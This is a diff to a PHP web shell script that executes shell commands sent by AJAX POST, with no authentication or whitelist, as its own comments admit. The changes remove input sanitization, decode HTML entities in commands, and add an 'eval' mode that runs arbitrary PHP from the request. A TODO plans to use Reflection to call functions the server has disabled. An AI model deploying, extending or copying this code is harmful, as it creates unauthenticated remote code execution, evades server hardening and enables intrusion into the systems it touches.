@@ -14,6 +14,16 @@
  * 需要做可执行命令的白名单
  * 需要做登录权限认证
  * ......
+ *
+ * 2015-10-9
+ * bugfix 对命令进行htmlEntityDecode，可以使用如下命令
+ * curl -X POST -d '{"start_time":1444271999}' http://path
+ * feature 添加eval
+ * eval return 1 + 1;
+ * eval echo 'hello';
+ *
+ * TODO:
+ * 添加Relefction执行被禁止函数
  */
 
 /**
@@ -52,6 +62,7 @@ class Shell
 	 */
 	public static function exec($cmd, $execFuncs = null)
 	{
+		$cmd = self::htmlEntityDecode($cmd);
 		$defaultExecFuncs = ['system', 'shell_exec', 'exec', 'passthru', 'proc_open', 'popen'];
 		if($execFuncs === null) {
 			$execFuncs = $defaultExecFuncs;
@@ -179,6 +190,16 @@ class Shell
 		return (is_callable($name) && function_exists($name));
 	}
 
+	// @see http://php.net/manual/zh/function.html-entity-decode.php#104617
+	public function htmlEntityDecode($cmd) {
+		if(function_exists('mb_convert_encoding')) {
+			return preg_replace_callback("/(&#[0-9]+;)/", function($m) {
+				return mb_convert_encoding($m[1], "UTF-8", "HTML-ENTITIES");
+			}, $cmd);
+		} else {
+			return $cmd;
+		}
+	}
 }
 
 
@@ -198,7 +219,7 @@ $isAjax = isset($_SERVER['HTTP_X_REQUESTED_WITH'])
 
 if($isAjax) {
 	// 命令 未过滤
-	$cmd = filter_input(INPUT_POST, 'cmd', FILTER_SANITIZE_STRING);
+	$cmd = filter_input(INPUT_POST, 'cmd'/*, FILTER_SANITIZE_STRING*/);
 
 	$cd = false;
 
@@ -228,13 +249,27 @@ if($isAjax) {
 	}
 
 	// 执行命令返回结果
-	if($cmd) {
-		echo json_encode([
-			'res' => $cd ? '' : Shell::exec($cmd),
-			'cwd' => $cwd,
-		]);
+	$res = '';
+	switch(true) {
+		case $cmd && (strcasecmp('eval ', substr($cmd, 0, strlen('eval '))) === 0):
+			ob_start();
+			$res = eval(Shell::htmlEntityDecode(trim(substr($cmd, strlen('eval ')))));
+			$buf = ob_get_clean();
+			if($res === false && ($error = error_get_last())) {
+				$res = $error['message'];
+			} else if($buf){
+				$res .= PHP_EOL . $buf;
+			}
+			break;
+		case $cmd:
+			$res = $cd ? '' : Shell::exec($cmd);
+			break;
 	}
-	exit;
+
+	exit(json_encode([
+		'res' => $res,
+		'cwd' => $cwd,
+	], JSON_UNESCAPED_UNICODE));
 }
 ?>
 <!DOCTYPE HTML>
